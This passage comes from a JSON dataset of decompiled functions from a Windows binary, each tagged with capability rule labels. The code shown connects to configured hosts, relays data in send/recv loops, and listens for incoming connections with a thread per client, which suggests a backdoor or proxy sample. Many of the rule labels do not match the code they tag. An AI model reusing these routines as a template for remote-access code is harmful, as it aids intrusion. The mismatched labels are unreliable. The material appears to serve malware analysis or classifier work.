0x54))();\n            iVar2 = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            if ((var_20h != -1) && (iVar2 != -1)) {\n                (**(*var_18h + 0xc))(var_ch);\n                (**(*piVar1 + 0xc))(0x46a1dc, var_6ch);\n                fcn.00421fe8();\n                var_30h = var_70h;\n                (**(*piVar1 + 0xc))(0x46a1dc);\n                fcn.00421fe8();\n                (**(*piVar1 + 0xc))(0x46a1dc, var_78h);\n                fcn.00421fe8();\n                (**(*piVar1 + 0xc))(0x46a2d8, var_80h);\n                var_14h = 0x469f50;\n                fcn.00421fe8();\n                var_14h = var_88h;\n                var_18h = 0x46a1dc;\n                var_1ch = 0x46a2e4;\n                var_20h = 0x46a204;\n                fcn.004058e0();\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    fcn.004216f0();\n    (**(*var_18h + 0x44))();\n    (**(*piVar1 + 0x44))();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421d58();\n    var_30h = (**(*var_18h + 0x14))();\n    if (-1 < var_30h + -1) {\n        var_1ch = 0;\n        do {\n            fcn.004216f0();\n            (**(*var_18h + 0xc))();\n            fcn.00405864();\n            fcn.00421864();\n            fcn.00421e20();\n            var_20h = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            iVar2 = (**(*piVar1 + 0x54))();\n            if ((var_20h != -1) && (iVar2 != -1)) {\n                (**(*var_18h + 0xc))(var_10h);\n                (**(*piVar1 + 0xc))(0x46a1dc, var_98h);\n                fcn.00421fe8();\n                var_30h = var_9ch;\n                (**(*piVar1 + 0xc))(0x46a1dc);\n                fcn.00421fe8();\n                (**(*piVar1 + 0xc))(0x46a1dc, var_a4h);\n                var_14h = 0x46a103;\n                fcn.00421fe8();\n                var_14h = var_ach;\n                var_18h = 0x46a1dc;\n                var_1ch = 0x46a2e4;\n                var_20h = 0x46a204;\n                fcn.004058e0();\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    iVar2 = var_10h;\n    fcn.004058e0(var_10h, var_ch, var_8h, var_4h);\n    fcn.00404650();\n    fcn.00404650();\n    fcn.00404650();\n    *in_FS_OFFSET = iVar2;\n    fcn.00405554(0x46a192);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2422
    },
    "0046d674": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0046d674(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffff954;\n    int32_t iStack1680;\n    uint uStack1676;\n    uchar *puStack1672;\n    uint uStack1668;\n    uint uStack1664;\n    uint uStack1660;\n    int32_t iStack1656;\n    uint uStack1652;\n    uchar *puStack1648;\n    uint var_65ch;\n    uint var_658h;\n    uint var_654h;\n    uint var_1ch;\n    int32_t in;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s;\n    \n    puStack1648 = &stack0xfffffffc;\n    uStack1652 = 0x46d7a5;\n    iStack1656 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff988;\n    uStack1660 = 0x46d6a1;\n    fcn.00405530();\n    uStack1660 = 0;\n    uStack1664 = 1;\n    uStack1668 = 2;\n    puStack1672 = 0x46d6ac;\n    iVar1 = sub.wsock32.dll_socket();\n    s = iVar1;\n    if (iVar1 != -1) {\n        uStack1676 = 0x46d777;\n        iStack1680 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff970;\n        puStack1672 = &stack0xfffffffc;\n        iVar2 = sub.WS2_32.DLL_WSAIoctl\n                          (iVar1, 0x4004747f, 0, 0, &fcn.0046d674::var_658h, 0x400, &fcn.0046d674::var_8h, 0, 0);\n        if ((iVar2 != -1) && (-1 < var_8h / 0x4c + -1)) {\n            var_ch = var_8h / 0x4c;\n            puVar3 = &fcn.0046d674::var_654h;\n            do {\n                var_1ch = *puVar3;\n                in = puVar3[1];\n                uStack24 = puVar3[2];\n                uStack20 = puVar3[3];\n                sub.wsock32.dll_inet_ntoa(puVar3[1]);\n                fcn.00405728();\n                fcn.00405818();\n                var_1ch = puVar3[0xc];\n                in = puVar3[0xd];\n                uStack24 = puVar3[0xe];\n                uStack20 = puVar3[0xf];\n                var_1ch = puVar3[6];\n                iVar1 = puVar3[7];\n                in = iVar1;\n                uStack24 = puVar3[8];\n                uStack20 = puVar3[9];\n                sub.wsock32.dll_inet_ntoa(in_EAX);\n                fcn.00405818();\n                puVar3 = puVar3 + 0x13;\n                var_ch = var_ch + -1;\n            } while (var_ch != 0);\n        }\n        *in_FS_OFFSET = iVar1;\n        in_stack_fffff954 = s;\n        sub.wsock32.dll_closesocket();\n    }\n    *in_FS_OFFSET = in_stack_fffff954;\n    fcn.00405530(0x46d7ac);\n    return;\n}\n",
        "token_count": 818
    },
    "0046e080": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e080(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY100;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint lpNumberOfBytesRead;\n    uint *lpBuffer;\n    uint var_4h;\n    \n    puStack32 = 0x46e097;\n    lpBuffer = param_2;\n    fcn.004059cc();\n    uStack36 = 0x46e122;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(0x80000000, 1, 0, 3, 0, 0);\n    iVar2 = sub.kernel32.dll_CreateFileA_1(uVar1);\n    if (iVar2 != -1) {\n        uVar1 = sub.kernel32.dll_GetFileSize_1(iVar2, 0);\n        fcn.00406928(uVar1);\n        sub.kernel32.dll_ReadFile_1(iVar2, *lpBuffer, uVar1, &fcn.0046e080::lpNumberOfBytesRead, 0);\n        sub.kernel32.dll_CloseHandle_1();\n        iStackY100 = iVar2;\n    }\n    *in_FS_OFFSET = iStackY100;\n    fcn.00405530(0x46e129);\n    return;\n}\n",
        "token_count": 348
    },
    "0047f8a8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047f8a8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != -1) {\n        *(in_EAX + 0x44) = param_2;\n        return;\n    }\n    *(in_EAX + 0x48) = 0xffffffff;\n    return;\n}\n",
        "token_count": 87
    },
    "0047fdc4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047fdc4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != -1) {\n        *(in_EAX + 0x44) = param_2;\n        return;\n    }\n    *(in_EAX + 0x48) = 0xffffffff;\n    return;\n}\n",
        "token_count": 85
    },
    "004800bc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004800bc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar auStack372 [8];\n    uint uStack364;\n    uint uStack360;\n    uint *puStack356;\n    uint uStack352;\n    uint uStack348;\n    uchar *puStack344;\n    uint var_150h;\n    uint var_134h;\n    uint var_130h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack344 = 0x4800d0;\n    fcn.004059cc();\n    uStack348 = 0x48016e;\n    uStack352 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffea0;\n    puStack356 = &fcn.004800bc::var_150h;\n    uStack360 = 0x4800ed;\n    puStack344 = &stack0xfffffffc;\n    uStack360 = fcn.004059dc();\n    uStack364 = 0x4800f3;\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1();\n    if (iVar2 == -1) {\n        var_10h = 0;\n        var_ch = 0;\n        *in_FS_OFFSET = uStack360;\n        uStack352 = 0x480175;\n        puStack356 = 0x48016d;\n        fcn.00405530();\n        return;\n    }\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe8c;\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 364
    },
    "004816a8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004816a8 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1076 = &stack0xfffffffc;\n    var_420h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack1080 = 0x481820;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1084;\n    fcn.00405728();\n    fcn.00405b28(&var_420h);\n    fcn.00405a44();\n    uVar1 = fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    uVar2 = fcn.00409ecc();\n    fcn.004815cc();\n    iVar3 = sub.wsock32.dll_socket(2, 1, 6);\n    if (iVar3 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00403af4();\n    var_1ch._0_2_ = 2;\n    var_18h = sub.wsock32.dll_inet_addr(uVar1);\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    if (var_18h == -1) {\n        iVar4 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar4 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_18h = ***(iVar4 + 0xc);\n    }\n    iVar4 = sub.wsock32.dll_connect(iVar3, &var_1ch, 0x10);\n    if (iVar4 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00481528();\n    sub.wsock32.dll_recv(iVar3, &var_41ch, 0x400, 0);\n    fcn.00405728();\n    sub.kernel32.dll_Sleep_1(1000);\n    sub.wsock32.dll_closesocket(iVar3);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 647
    },
    "00481a04": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00481a04 noreturn (int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack56 = 0x481a29;\n    fcn.00405fe8();\n    uStack60 = 0x481b7b;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    uStack72 = 0x481b39;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack56 = &stack0xfffffffc;\n    fcn.00408550();\n    fcn.004055c8();\n    uVar2 = *(arg_8h + 4);\n    fcn.00403af4();\n    iVar1 = sub.wsock32.dll_socket(2, 1, 0);\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    var_1ch._0_2_ = 2;\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    uVar2 = fcn.004059dc();\n    var_18h = sub.wsock32.dll_inet_addr(uVar2);\n    if (var_18h == -1) {\n        uVar2 = fcn.004059dc();\n        iVar3 = sub.wsock32.dll_gethostbyname(uVar2);\n        if (iVar3 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_18h = ***(iVar3 + 0xc);\n    }\n    iVar3 = sub.wsock32.dll_connect(iVar1, &fcn.00481a04::var_1ch, 0x10);\n    if (iVar3 == 0) {\n        fcn.00409d60(0x481ba8, var_4h, 0x481b94);\n        fcn.004058e0(0);\n        fcn.00474d1c();\n        sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 682
    },
    "00482cd4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00482cd4 noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack1076;\n    uint uStack1072;\n    uchar *puStack1068;\n    uint var_418h;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1068 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack1072 = 0x482de3;\n    uStack1076 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1076;\n    fcn.004055c8();\n    iVar1 = sub.wsock32.dll_socket(2, 1, 6);\n    if (iVar1 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00403af4();\n    var_18h._0_2_ = 2;\n    var_14h = sub.wsock32.dll_inet_addr(arg_8h);\n    var_18h._2_2_ = sub.wsock32.dll_htons(0x50);\n    if (var_14h == -1) {\n        iVar2 = sub.wsock32.dll_gethostbyname(arg_8h);\n        if (iVar2 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_14h = ***(iVar2 + 0xc);\n    }\n    iVar2 = sub.wsock32.dll_connect(iVar1, &var_18h, 0x10);\n    if (iVar2 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00474dbc();\n    sub.wsock32.dll_recv(iVar1, &var_418h, 0x400, 0);\n    fcn.00405728();\n    sub.kernel32.dll_Sleep_1(1000);\n    sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 539
    },
    "00483da0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00483da0 noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack1132;\n    uint uStack1128;\n    uchar *puStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    uchar *puStack1112;\n    uint var_444h;\n    uint var_440h;\n    uint var_43ch;\n    int32_t var_438h;\n    uint var_42ch;\n    int32_t *var_2ch;\n    int32_t var_28h;\n    uint var_20h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1124 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack1112 = 0x483dd4;\n    fcn.00405fe8();\n    uStack1116 = 0x484033;\n    uStack1120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffba0;\n    uStack1128 = 0x483fcd;\n    uStack1132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffb94;\n    puStack1112 = &stack0xfffffffc;\n    var_2ch = fcn.0041bffc();\n    fcn.00408550();\n    fcn.004055c8();\n    fcn.004055c8();\n    fcn.004055c8();\n    fcn.00461334();\n    fcn.004055c8();\n    fcn.0041c118();\n    var_28h = sub.wsock32.dll_socket(2, 1, 0);\n    if (var_28h == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    var_43ch._0_2_ = 2;\n    var_43ch._2_2_ = sub.wsock32.dll_htons(**0x49248c);\n    var_438h = sub.wsock32.dll_inet_addr(**0x4925e8);\n    if (var_438h == -1) {\n        iVar1 = sub.wsock32.dll_gethostbyname(**0x4925e8);\n        if (iVar1 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_438h = ***(iVar1 + 0xc);\n    }\n    sub.wsock32.dll_connect(var_28h, &fcn.00483da0::var_43ch, 0x10);\n    iVar1 = sub.wsock32.dll_recv(var_28h, &fcn.00483da0::var_42ch, 0x400, 0);\n    if (iVar1 != -1) {\n        fcn.004058e0(var_ch, 0x484064, var_8h, 0x484050);\n        fcn.00474dbc();\n        uVar3 = 0x400;\n        iVar1 = sub.wsock32.dll_recv(var_28h, &fcn.00483da0::var_42ch, 0x400, 0);\n        if (iVar1 != -1) {\n            fcn.0041b724(0, 0);\n            while( true ) {\n                fcn.00403af4();\n                iVar1 = (**(*var_2ch + 0xc))();\n                if (iVar1 < 1) break;\n                iVar2 = sub.wsock32.dll_send(uVar3, &fcn.00483da0::var_42ch, iVar1, 0);\n                if (iVar2 == -1) break;\n                iVar2 = sub.wsock32.dll_recv(var_28h, &fcn.00483da0::var_42ch, 0x400, 0);\n                if ((iVar2 == -1) || (iVar1 < 1)) break;\n            }\n        }\n    }\n    sub.wsock32.dll_shutdown(var_28h, 2);\n    sub.wsock32.dll_closesocket(var_28h);\n    fcn.00404650();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 999
    },
    "0048479c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048479c(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack76;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint name;\n    int32_t var_ch;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x4848ce;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack52;\n    *0x49a39c = sub.wsock32.dll_socket(2, 1, 0);\n    if (*0x49a39c != -1) {\n        name._0_2_ = 2;\n        name._2_2_ = sub.wsock32.dll_htons(**0x49248c);\n        var_ch = sub.wsock32.dll_inet_addr(**0x4925e8);\n        if (var_ch == -1) {\n            iStack76 = **0x4925e8;\n            iVar1 = sub.wsock32.dll_gethostbyname();\n            if (iVar1 == 0) goto code_r0x004848b3;\n            var_ch = ***(iVar1 + 0xc);\n        }\n        sub.wsock32.dll_connect(*0x49a39c, &name, 0x10);\n        sub.wsock32.dll_recv(*0x49a39c, 0x49839c, 0x1fff, 0);\n        fcn.00403af4();\n        fcn.00409d60();\n        fcn.00405864();\n        fcn.00474dbc();\n        iStack76 = *0x49a39c;\n        sub.wsock32.dll_recv();\n        fcn.00403af4();\n    }\ncode_r0x004848b3:\n    *in_FS_OFFSET = iStack76;\n    fcn.00405554(0x4848d5);\n    return;\n}\n",
        "token_count": 456
    },
    "00485474": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00485474 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t *unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack124 = 0x4854ab;\n    fcn.00405fe8();\n    uStack128 = 0x48568e;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.00408550();\n    uVar1 = sub.wsock32.dll_socket(2, 1, 6);\n    fcn.00403af4();\n    var_30h._0_2_ = 2;\n    var_30h._2_2_ = sub.wsock32.dll_htons(var_10h & 0xffff);\n    var_2ch = 0;\n    iVar2 = sub.wsock32.dll_bind(uVar1, &fcn.00485474::var_30h, 0x10);\n    if (iVar2 == 0) {\n        iVar2 = sub.wsock32.dll_listen(uVar1, 5);\n        if (iVar2 == 0) {\n            uVar5 = 0;\n            uVar3 = var_10h;\n            fcn.00409e4c(var_10h);\n            fcn.00405864(uVar3, uVar5);\n            fcn.00486078();\n            fcn.00409d60();\n            uVar4 = 0;\n            uVar5 = 0;\n            fcn.00409e4c(var_10h);\n            fcn.0048571c(uVar5, uVar4);\n            while( true ) {\n                var_20h = 0x10;\n                var_18h = sub.wsock32.dll_accept(uVar1, &fcn.00485474::var_40h, &fcn.00485474::var_20h);\n                if (var_18h == 0xffffffff) break;\n                unaff_EBX = sub.kernel32.dll_LocalAlloc_1(0x40, 0x10);\n                *unaff_EBX = var_10h;\n                fcn.00405584();\n                fcn.00405584();\n                unaff_EBX[3] = var_18h;\n                uVar5 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.00484f60, unaff_EBX, 0, &fcn.00485474::var_1ch);\n                sub.kernel32.dll_CloseHandle_1(uVar5);\n                sub.kernel32.dll_Sleep_1();\n            }\n            uVar3 = *unaff_EBX;\n            uVar1 = 0;\n            fcn.00409e4c(uVar3);\n            fcn.00405864(uVar3, uVar1);\n            fcn.00486078();\n            uVar3 = *unaff_EBX;\n            uVar1 = 0;\n            fcn.00409e4c(uVar3);\n            fcn.00485ad0(uVar3, uVar1);\n            goto code_r0x0048565e;\n        }\n    }\n    uVar3 = *unaff_EBX;\n    uVar1 = 0;\n    fcn.00409e4c(uVar3);\n    fcn.00405864(uVar3, uVar1);\n    fcn.00486078();\n    uVar3 = *unaff_EBX;\n    uVar1 = 0;\n    fcn.00409e4c(uVar3);\n    fcn.00485ad0(uVar3, uVar1);\ncode_r0x0048565e:\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 1031
    },
    "0048788c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048788c noreturn (void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_414h;\n    int32_t var_410h;\n    uint var_404h;\n    int32_t *var_4h;\n    \n    puStack1076 = &stack0xfffffffc;\n    uStack1080 = 0x487a89;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1084;\n    var_4h = fcn.0041bffc();\n    fcn.00461334();\n    fcn.00405584();\n    fcn.0041c118();\n    iVar1 = sub.wsock32.dll_socket(2, 1, 0);\n    if (iVar1 != -1) {\n        var_414h._0_2_ = 2;\n        var_414h._2_2_ = sub.wsock32.dll_htons(**0x49248c);\n        var_410h = sub.wsock32.dll_inet_addr(**0x4925e8);\n        if (var_410h == -1) {\n            iVar2 = sub.wsock32.dll_gethostbyname(**0x4925e8);\n            if (iVar2 == 0) goto code_r0x00487a4e;\n            var_410h = ***(iVar2 + 0xc);\n        }\n        sub.wsock32.dll_connect(iVar1, &var_414h, 0x10);\n        uVar5 = 0;\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            uVar4 = 0x487aa0;\n            fcn.00409d60(0x487ab4, *(in_EAX + 0x48), 0x487aa0);\n            fcn.004058e0(0);\n            fcn.00474dbc();\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                fcn.0041b724(0, 0);\n                while( true ) {\n                    fcn.00403af4();\n                    iVar2 = (**(*var_4h + 0xc))();\n                    if (iVar2 < 1) break;\n                    iVar3 = sub.wsock32.dll_send(uVar5, &var_404h, iVar2, 0, iVar1);\n                    if (iVar3 == -1) break;\n                    iVar3 = sub.wsock32.dll_recv(uVar4, &var_404h, 0x400, 0);\n                    if ((iVar3 == -1) || (iVar2 < 1)) break;\n                }\n            }\n        }\n    }\ncode_r0x00487a4e:\n    sub.wsock32.dll_shutdown(iVar1, 2);\n    sub.wsock32.dll_closesocket(iVar1);\n    fcn.00404650();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 752
    },
    "0048ad74": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0048ad74(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint lpLastWriteTime;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    int32_t hObject;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uStack52 = 0;\n    uStack56 = 0;\n    uStack60 = 3;\n    uStack64 = 0;\n    uStack68 = 1;\n    uStack72 = 0x80000000;\n    uStack76 = 0x48ad9d;\n    uStack76 = fcn.004059dc();\n    puStack80 = 0x48ada3;\n    iVar2 = sub.kernel32.dll_CreateFileA_1();\n    if (iVar2 == -1) {\n        return var_1h;\n    }\n    uStack84 = 0x48ae1e;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &fcn.0048ad74::var_1h + 1;\n    hObject = iVar2;\n    iVar3 = sub.kernel32.dll_GetFileTime\n                      (iVar2, &fcn.0048ad74::lpCreationTime, &fcn.0048ad74::lpLastAccessTime, \n                       &fcn.0048ad74::lpLastWriteTime);\n    if (iVar3 != 0) {\n        cVar1 = fcn.0048ad34();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0048ad34();\n            if (cVar1 != '\\0') {\n                cVar1 = fcn.0048ad34();\n                if (cVar1 != '\\0') {\n                    var_1h._0_1_ = 1;\n                    goto code_r0x0048ae04;\n                }\n            }\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x0048ae04:\n    *in_FS_OFFSET = iVar2;\n    uVar4 = sub.kernel32.dll_CloseHandle_1(hObject, 0x48ae25);\n    return uVar4;\n}\n",
        "token_count": 612
    },
    "00404418": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint fcn.00404418(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetKeyboardType(0);\n    if (iVar1 == 7) {\n        uVar2 = sub.user32.dll_GetKeyboardType(1);\n        if (((uVar2 & 0xff00) == 0xd00) || ((uVar2 & 0xff00) == 0x400)) {\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 135
    },
    "00404924": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
